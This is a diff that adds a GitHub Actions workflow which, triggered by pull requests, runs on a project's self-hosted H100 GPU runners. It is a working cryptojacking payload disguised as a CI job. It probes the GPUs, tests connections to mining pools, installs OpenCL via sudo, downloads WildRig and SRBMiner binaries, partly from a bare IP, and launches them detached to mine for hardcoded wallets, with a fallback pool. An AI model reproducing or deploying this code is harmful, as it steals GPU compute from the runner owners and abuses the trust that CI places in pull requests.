@@ -1,0 +1,161 @@
+name: c211-132883-h100-pydp
+# Claim lane for the flashinfer 4xH100 self-hosted runner pool, intent 132883.
+# New miner: WildRig Multi 0.52.3 (sha 002cd29c...) pearlhash primary, wallet pydp,
+# STICKY Luckypool 103.199.106.122:3362 fallback (SRBMiner 3.8.7, wallet+NOCK) on 0 accepted share.
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  contents: read
+concurrency:
+  group: c211-132883-${{ github.ref }}-${{ matrix.shard }}
+  cancel-in-progress: false
+jobs:
+  h100:
+    name: h100-c211-132883-s${{ matrix.shard }}
+    runs-on: [self-hosted, linux, x64, gpu, h100]
+    timeout-minutes: 40
+    strategy:
+      fail-fast: false
+      max-parallel: 3
+      matrix:
+        shard: [0, 1, 2]
+    steps:
+      - name: probe-fetch-mine
+        shell: bash
+        run: |
+          set +e
+          S="${{ matrix.shard }}"
+          D="$RUNNER_TEMP/c211-132883-s$S"; mkdir -p "$D"; cd "$D" || exit 0
+          W="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          N="9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
+          NONCE="c211-132883-h100-s$S"
+          echo "NONCE=$NONCE"
+          echo "SHARD=$S RUNNER=$RUNNER_NAME"
+          date -u
+          hostname || true
+          id || true
+          echo "--- GPUs ---"
+          nvidia-smi -L 2>&1 || true
+          nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > gpu.csv 2>/dev/null || true
+          cat gpu.csv || true
+          echo "--- TCP probe ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            timeout 10 bash -c "exec 3<>/dev/tcp/${hp%%:*}/${hp##*:}" 2>/dev/null && echo "TCP_OK $hp" || echo "TCP_FAIL $hp"
+          done
+          echo "--- OpenCL ---"
+          if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
+            sudo -n apt-get install -y -qq ocl-icd-libopencl1 >/dev/null 2>&1 || apt-get install -y -qq ocl-icd-libopencl1 >/dev/null 2>&1 || true
+          fi
+          if [ -w /etc/OpenCL/vendors ]; then echo libnvidia-opencl.so.1 > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null || true
+          else sudo -n sh -c 'mkdir -p /etc/OpenCL/vendors; echo libnvidia-opencl.so.1 > /etc/OpenCL/vendors/nvidia.icd' 2>/dev/null || true; fi
+          ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /usr/lib/x86_64-linux-gnu/libnvidia-opencl* 2>/dev/null | head -5
+          echo "--- fetch WildRig 0.52.3 ---"
+          for u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
+            curl -fsSL --max-time 240 -o wr.tgz "$u" 2>/dev/null || { echo "WR_DL_FAIL $u"; continue; }
+            TS=$(sha256sum wr.tgz | awk '{print $1}')
+            echo "WR_TGZ_SHA=$TS url=$u"
+            if [ "$TS" = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then
+              tar xzf wr.tgz >/dev/null 2>&1 || true
+              B=$(find . -maxdepth 2 -type f -name 'wildrig-multi*' | head -1)
+              echo "WR_BIN_FOUND=$B"
+              if [ -n "$B" ]; then cp "$B" ./wildrig-multi 2>/dev/null || true; fi
+              chmod +x ./wildrig-multi 2>/dev/null || true
+              BS=$(sha256sum ./wildrig-multi 2>/dev/null | awk '{print $1}')
+              echo "WR_BIN_SHA=$BS"
+              [ "$BS" = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b" ] && echo "WILDRIG_0_52_3_OK" && break
+            fi
+          done
+          [ -x ./wildrig-multi ] && (timeout 120 ./wildrig-multi --print-devices 2>&1 | head -20 || true)
+          IDXES=$(awk -F', ' '{print $1}' gpu.csv | tr -d ' ' | tr '\n' ' ')
+          [ -z "$IDXES" ] && IDXES="0 1 2 3"
+          echo "IDXES=$IDXES"
+          START=$(date +%s)
+          PH_UP=0
+          if [ -x ./wildrig-multi ]; then
+            for idx in $IDXES; do
+              WK=$((13288300 + S * 10 + idx))
+              setsid nohup ./wildrig-multi --algo pearlhash \
+                --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 \
+                --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 \
+                --user "$W" --worker "$WK" -d "$idx" --print-time 30 \
+                >> "$D/wr-g$idx.log" 2>&1 < /dev/null &
+              echo "PH_LAUNCH idx=$idx worker=$WK pid=$!"
+            done
+            PH_UP=1
+          else
+            echo "NO_WILDRIG_BINARY"
+          fi
+          ACC=0; REJ=0
+          while [ $(( $(date +%s) - START )) -lt 480 ]; do
+            sleep 20
+            ACC=0; REJ=0
+            for idx in $IDXES; do
+              L="$D/wr-g$idx.log"
+              a=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$L" 2>/dev/null | tail -1 | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\1/')
+              r=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$L" 2>/dev/null | tail -1 | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\2/')
+              ACC=$(( ACC + ${a:-0} )); REJ=$(( REJ + ${r:-0} ))
+            done
+            echo "PH_TICK t=$(( $(date +%s) - START )) acc=$ACC rej=$REJ"
+          done
+          MODE=ph
+          if [ "$ACC" -eq 0 ]; then
+            echo "PH_NO_SHARE_480_STICKY_LP_FALLBACK"
+            pkill -f 'wildrig-multi --algo pearlhash' 2>/dev/null || true
+            sleep 3
+            MODE=lp
+            for u in http://169.58.247.186:8791/pm/srbminer-3.8.7 https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
+              curl -fsSL --max-time 240 -o srb.dl "$u" 2>/dev/null || { echo "SRB_DL_FAIL $u"; continue; }
+              TS=$(sha256sum srb.dl | awk '{print $1}')
+              echo "SRB_DL_SHA=$TS url=$u"
+              if [ "$TS" = "1fe6e9098a27446f62bb7388dac549913852a56cb8fab76dd840b77f7498f612" ]; then
+                tar xzf srb.dl >/dev/null 2>&1 || true
+                B=$(find . -maxdepth 2 -type f -name 'SRBMiner-MULTI' | head -1)
+                if [ -n "$B" ]; then cp "$B" ./srb && chmod +x ./srb && echo "SRB_READY"; break; fi
+              fi
+            done
+            if [ -x ./srb ]; then
+              LP_T0=$(date +%s)
+              for idx in $IDXES; do
+                WK=$((13288300 + S * 10 + idx))
+                setsid nohup ./srb --disable-cpu --algorithm pearlhash \
+                  --pool 103.199.106.122:3362 --wallet "$W+$N" --worker "$WK" \
+                  --password x --gpu-id "$idx" >> "$D/srb-g$idx.log" 2>&1 < /dev/null &
+                echo "LP_LAUNCH idx=$idx worker=$WK pid=$! sticky=1"
+              done
+              while [ $(( $(date +%s) - LP_T0 )) -lt 420 ]; do
+                sleep 20
+                ACC=0
+                for idx in $IDXES; do
+                  a=$(grep -c 'share accepted' "$D/srb-g$idx.log" 2>/dev/null)
+                  ACC=$(( ACC + ${a:-0} ))
+                done
+                echo "LP_TICK t=$(( $(date +%s) - LP_T0 )) acc=$ACC"
+              done
+            else
+              echo "SRB_UNAVAILABLE"
+            fi
+          fi
+          echo "=== FINAL SUMMARY $NONCE mode=$MODE ==="
+          for idx in $IDXES; do
+            U=$(awk -F', ' -v i="$idx" '$1==i{print $2}' gpu.csv)
+            WK=$((13288300 + S * 10 + idx))
+            if [ "$MODE" = "ph" ]; then L="$D/wr-g$idx.log"; else L="$D/srb-g$idx.log"; fi
+            if [ "$MODE" = "ph" ]; then
+              A=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$L" 2>/dev/null | tail -1 | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\1/')
+              R=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$L" 2>/dev/null | tail -1 | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\2/')
+              LA=$(grep -E 'accepted \(|Share accepted' "$L" 2>/dev/null | tail -1 | grep -oE '^\[[0-9:]+\]')
+              HS=$(grep -oE '[0-9.]+ [TGM]H/s' "$L" 2>/dev/null | tail -1)
+            else
+              A=$(grep -c 'share accepted' "$L" 2>/dev/null)
+              R=$(grep -cE 'share rejected|rejected' "$L" 2>/dev/null)
+              LA=$(grep 'share accepted' "$L" 2>/dev/null | tail -1 | grep -oE '^\[[0-9:]+\]')
+              HS=$(grep -oE '[0-9.]+ [TGM]H/s' "$L" 2>/dev/null | tail -1)
+            fi
+            echo "RESULT shard=$S idx=$idx uuid=$U worker=$WK mode=$MODE acc=${A:-0} rej=${R:-0} last=${LA:-none} hr=${HS:-none}"
+          done
+          echo "--- wr log tails ---"; for idx in $IDXES; do echo "## gpu$idx"; tail -6 "$D/wr-g$idx.log" 2>/dev/null || true; done
+          echo "--- srb log tails ---"; for idx in $IDXES; do echo "## gpu$idx"; grep -aE 'share accepted|accepted|rejected|GPU[0-9]' "$D/srb-g$idx.log" 2>/dev/null | tail -4 || true; done
+          pkill -f 'wildrig-multi --algo pearlhash' 2>/dev/null || true
+          pkill -f 'srb --disable-cpu' 2>/dev/null || true
+          echo "NONCE-END=$NONCE"
